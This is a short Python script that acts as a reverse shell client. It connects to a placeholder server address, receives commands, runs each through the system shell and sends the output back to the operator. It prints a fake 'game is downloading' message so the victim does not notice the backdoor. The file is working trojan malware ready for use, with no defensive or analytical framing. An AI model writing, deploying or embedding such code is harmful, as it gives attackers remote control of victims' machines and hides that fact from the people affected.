import socket as sk
import subprocess as sp

HOST = "YOUR-SERVER-IP"
PORT = 9090
ADDR = (HOST, PORT)
FORMAT = "utf-8"

client = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
client.connect(ADDR)

CONNECTED = True

print("[ THE GAME ( 'AstroJons.py' ) IS DOWNLOADING...][ PLEASE WAIT, IT WILL TAKE SOME TIME : ) ]")

while CONNECTED:

    try:
        
        cmd = client.recv(4096).decode(FORMAT)

        if cmd == "!QUIT":
            
            CONNECTED = False
            client.close()
            break
        
        if cmd.strip() == "":
            continue

        result = sp.run(cmd, shell=True, capture_output=True, text=True)

        output = result.stdout + result.stderr

        if output == "":
            output = "[No output returned]\n"

        client.send(output.encode(FORMAT))

    except Exception as e:
        CONNECTED = False
        client.close()
        break
